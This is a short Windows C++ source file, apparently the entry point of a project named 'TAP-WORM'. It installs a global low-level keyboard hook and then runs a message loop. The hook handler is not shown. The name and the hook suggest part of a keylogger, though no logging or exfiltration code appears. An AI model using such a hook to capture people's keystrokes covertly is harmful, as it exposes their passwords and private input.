/**
* @file main.cpp
* @author Vihos
*/

/* DEFAULT C++ LIB'S */
#include <windows.h>

/* DEFINITIONS */
//...

/* TAP-WORM LIB'S  */
#include "Common.h"

#include "Keyboard.h"
//...

/* CODE SEGMENT */
int WINAPI WinMain(HINSTANCE hInstance,
                   HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    // Hook keyboard
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keyboard::hookProc, hInstance, 0);

    Common::msgLoop();

    return 0;
}